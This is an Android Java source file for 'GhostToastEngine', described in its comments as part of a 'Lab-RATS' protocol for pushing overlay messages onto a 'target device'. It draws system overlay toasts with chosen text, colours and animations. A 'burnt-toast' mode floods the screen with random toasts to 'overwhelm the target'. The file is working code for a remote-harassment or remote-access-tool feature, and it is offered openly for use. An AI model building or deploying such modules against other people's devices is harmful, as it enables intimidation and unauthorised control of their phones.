package com.fason.app.features.ghost;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationSet;
import android.view.animation.ScaleAnimation;
import android.view.animation.TranslateAnimation;
import android.widget.FrameLayout;
import android.widget.TextView;

import com.fason.app.core.FasonApp;

import java.util.Random;

/**
 * GhostToastEngine — Lab-RATS GhostToast protocol, rebuilt for Fason.
 *
 * Dispatches tactical overlay toasts on the target device:
 *  - Custom text, background color, text color
 *  - Animations: pop (scale in), scroll (slide from top), static (fade)
 *  - Burnt-toast mode: spawns N random toasts across the screen to
 *    overwhelm the target
 *  - Every toast is touch-through (FLAG_NOT_TOUCHABLE) so the device
 *    remains usable underneath
 */
public final class GhostToastEngine {
    private static final String TAG = "GhostToast";
    private static final Random rng = new Random();
    private static final Handler handler = new Handler(Looper.getMainLooper());

    public enum Anim { POP, SCROLL, STATIC }

    private GhostToastEngine() {}

    public static void show(String text, String bgColor, String textColor,
                            Anim anim, long durationMs) {
        Context ctx = FasonApp.getContext();
        if (ctx == null) return;
        handler.post(() -> spawnToast(ctx, text, parseColor(bgColor, 0xE6202020),
            parseColor(textColor, 0xFFFFFFFF), anim, durationMs, Gravity.TOP | Gravity.CENTER_HORIZONTAL, 0.12f));
    }

    /** Burnt-toast: N random toasts scattered over 3 seconds. */
    public static void burntToast(String text, int count) {
        Context ctx = FasonApp.getContext();
        if (ctx == null) return;
        for (int i = 0; i < count; i++) {
            final int idx = i;
            handler.postDelayed(() -> {
                int grav = Gravity.TOP | Gravity.CENTER_HORIZONTAL;
                float yFrac = 0.05f + rng.nextFloat() * 0.8f;
                int bg = Color.argb(230, rng.nextInt(200), rng.nextInt(200), rng.nextInt(200));
                int fg = Color.argb(255, 255, 255, 255);
                Anim anim = Anim.values()[rng.nextInt(Anim.values().length)];
                spawnToast(ctx, text, bg, fg, anim, 2500 + rng.nextInt(2000), grav, yFrac);
            }, i * (120 + rng.nextInt(200)));
        }
    }

    private static void spawnToast(Context ctx, String text, int bg, int fg,
                                   Anim anim, long durationMs, int gravity, float yFrac) {
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (wm == null) return;
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_TOAST;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT);
        lp.gravity = gravity;
        lp.y = (int) (ctx.getResources().getDisplayMetrics().heightPixels * yFrac);

        FrameLayout box = new FrameLayout(ctx);
        GradientDrawable bgDrawable = new GradientDrawable();
        bgDrawable.setCornerRadius(dp(ctx, 14));
        bgDrawable.setColor(bg);
        box.setBackground(bgDrawable);
        int padH = dp(ctx, 20), padV = dp(ctx, 12);
        box.setPadding(padH, padV, padH, padV);

        TextView tv = new TextView(ctx);
        tv.setText(text);
        tv.setTextColor(fg);
        tv.setTextSize(14f);
        box.addView(tv);

        try {
            wm.addView(box, lp);
        } catch (Exception e) {
            Log.w(TAG, "toast overlay (overlay perm missing?)", e);
            return;
        }

        Animation animation = buildAnimation(ctx, anim);
        if (animation != null) box.startAnimation(animation);

        handler.postDelayed(() -> {
            try {
                AlphaAnimation fade = new AlphaAnimation(1f, 0f);
                fade.setDuration(250);
                fade.setAnimationListener(new Animation.AnimationListener() {
                    @Override public void onAnimationStart(Animation a) {}
                    @Override public void onAnimationRepeat(Animation a) {}
                    @Override public void onAnimationEnd(Animation a) {
                        try { wm.removeView(box); } catch (Exception ignored) {}
                    }
                });
                box.startAnimation(fade);
            } catch (Exception ignored) {}
        }, durationMs);
    }

    private static Animation buildAnimation(Context ctx, Anim anim) {
        switch (anim) {
            case POP: {
                AnimationSet set = new AnimationSet(true);
                ScaleAnimation scale = new ScaleAnimation(0.5f, 1f, 0.5f, 1f,
                    Animation.RELATIVE_TO_SELF, 0.5f,
                    Animation.RELATIVE_TO_SELF, 0.5f);
                scale.setDuration(220);
                AlphaAnimation alpha = new AlphaAnimation(0f, 1f);
                alpha.setDuration(220);
                set.addAnimation(scale);
                set.addAnimation(alpha);
                return set;
            }
            case SCROLL: {
                TranslateAnimation slide = new TranslateAnimation(
                    Animation.RELATIVE_TO_PARENT, 0f,
                    Animation.RELATIVE_TO_PARENT, 0f,
                    Animation.RELATIVE_TO_PARENT, -0.15f,
                    Animation.RELATIVE_TO_PARENT, 0f);
                slide.setDuration(300);
                return slide;
            }
            case STATIC:
            default: {
                AlphaAnimation fade = new AlphaAnimation(0f, 1f);
                fade.setDuration(180);
                return fade;
            }
        }
    }

    private static int parseColor(String hex, int fallback) {
        if (hex == null || hex.isEmpty()) return fallback;
        try {
            return Color.parseColor(hex);
        } catch (IllegalArgumentException e) {
            return fallback;
        }
    }

    private static int dp(Context ctx, int v) {
        return (int) (v * ctx.getResources().getDisplayMetrics().density + 0.5f);
    }
}
